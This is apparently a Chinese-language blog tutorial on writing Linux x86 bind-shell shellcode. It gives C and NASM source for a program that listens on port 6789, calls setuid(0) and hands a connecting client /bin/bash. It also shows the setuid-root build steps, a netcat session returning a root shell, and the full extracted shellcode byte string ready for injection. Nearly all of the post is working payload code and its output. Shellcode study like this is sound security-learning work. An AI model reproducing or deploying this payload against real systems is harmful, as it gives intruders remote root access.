---
layout: post
title: 'shellcode remote'
subtitle: 'shellcode编写'
tags: 安全 逆向 shellcode linux
---

### retsh.c

绑定端口的shellcode

```C
// retsh.c

void main(){
    int server = socket(AF_INET, SOCK_STREAM, 0); // socket(2, 1, 0)
    struct sockaddr_in server_addr = { 0 }, client_addr = { 0 };
    
    server_addr.sin_family = AF_INET; // 2
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY); // 0
    server_addr.sin_port = htons(6789); // port

    bind(server, (struct sockaddr*)&server_addr, sizeof(server_addr));

    listen(server, 128);

    unsigned int len = sizeof(client_addr);
    int client = accept(server, (struct sockaddr*)&client_addr, &len);

    setuid(0);

    //重定向 STDIN STDOUT STDERR 至client
    dup2(client, STDIN_FILENO);  // 0
    dup2(client, STDOUT_FILENO); // 1
    dup2(client, STDERR_FILENO); // 2

    execve("/bin/bash", NULL, NULL);
}
```

启动服务端监听

```bash
rz$ gcc -m32 retsh.c -o retsh
rz$ sudo chown root.root retsh
rz$ sudo chmod u+s retsh
rz$ ./retsh
```

客户端连接

```bash
rz$ nc 127.0.0.1 6789
whoami
root
```

### 编写汇编

用到的系统函数有：

```C
// 359
int socket(int domain, int type, int protocol);

// 361
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

// 363
int listen(int sockfd, int backlog);

// 364
int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flag);

// 23
int setuid(uid_t uid);

// 63
int dup2(int oldfd, int newfd);

// 11
int execve(const char *filename, char *const argv[], char *const envp[]);
```

shell.asm：

```asm
; shell.asm

global _start

_start:

; int server = socket(2, 1, 0)
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
mov bl, 0x2
mov cl, 0x1
mov ax, 359
int 0x80
mov esi, eax ; 结果存入esi中

; bind(server, (struct socrkaddr*)&server_addr, sizeof(server_addr))
xor eax, eax
xor ecx, ecx
push eax        ; 0x0
push eax        ; 0x0
push eax        ; 0x0
mov eax, 0x851a0002 ; 0x851a0002
push eax
xor eax, eax
mov ebx, esi    ; server
mov ecx, esp    ; &server_addr 0x851a0002	0x00000000	0x00000000	0x0000000
xor edx, edx
mov dl, 0x10    ; sizeof(server_addr) -> 16
mov ax, 361
int 0x80

; listen(server, 128)
xor ecx, ecx
mov ebx, esi    ; server
mov cl, 128     ; 128
mov ax, 363
int 0x80

; int client = accept4(server, (struct sockaddr*)&client_addr, &len, 0);
mov ebx, esi    ; server
xor edx, edx    ; flag 0
xor eax, eax
push eax        ; 0x00
push eax        ; 0x00
push eax        ; 0x00
push eax        ; 0x00
mov ecx, esp    ; client_addr
mov al, 0x10     ; 16
push eax
mov edx, esp    ; &len
xor esi, esi    ; 0
mov ax, 364
int 0x80
mov edi, eax    ; 结果存入edi中

; setuid(0)
xor eax, eax
xor ebx, ebx    ; 0
mov al, 23
int 0x80

; 重定向STDIN STDOUT STDERR 至client
xor eax, eax
xor ecx, ecx    ; ecx清零
mov ebx, edi    ; client
mov al, 63
int 0x80        ; dup2(client, STDIN)
xor eax, eax
mov al, 63
inc ecx
int 0x80        ; dup2(client, STDOUT)
xor eax, eax
mov al, 63
inc ecx
int 0x80        ; dup2(client, STDERR)

; execve("/bin/bash", NULL, NULL)
xor eax, eax
xor ebx, ebx
xor ecx, ecx        ; NULL
xor edx, edx        ; NULL
mov al, 0x68
push eax
mov eax, 0x7361622f
push eax
mov eax, 0x6e69622f
push eax ;/bin/bash 
mov ebx, esp        ; /bin/bash
xor eax, eax
mov al, 11
int 0x80
```

### 编译链接

```bash
rz$ nasm -f elf shell.asm -o shell.o
rz$ ld -m elf_i386 shell.o -o shell
```

验证

```bash
rz$ sudo chown root.root shell
rz$ sudo chmod u+s shell
rz$ ./shell
```

客户端连接

```bash
rz$ nc 127.0.0.1 6789
whoami
root
```

### 提取shellcode

```bash
for i in `objdump -d shell.o | grep "^[[:space:]]*[0-9a-f]\+:" | cut -f 2`; do
    echo -n \\x$i;
done
\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x02\xb1\x01\x66\xb8\x67\x01\xcd\x80\x89\xc6\x31\xc0\x31\xc9\x50\x50\x50\xb8\x02\x00\x1a\x85\x50\x31\xc0\x89\xf3\x89\xe1\x31\xd2\xb2\x10\x66\xb8\x69\x01\xcd\x80\x31\xc9\x89\xf3\xb1\x80\x66\xb8\x6b\x01\xcd\x80\x89\xf3\x31\xd2\x31\xc0\x50\x50\x50\x50\x89\xe1\xb0\x10\x50\x89\xe2\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x89\xc7\x31\xc0\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x31\xc9\x89\xfb\xb0\x3f\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\xb0\x3f\x41\xcd\x80\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x68\x50\xb8\x2f\x62\x61\x73\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\xcd\x80
```

[代码](https://github.com/rzte/the-art-of-exploitation.git)
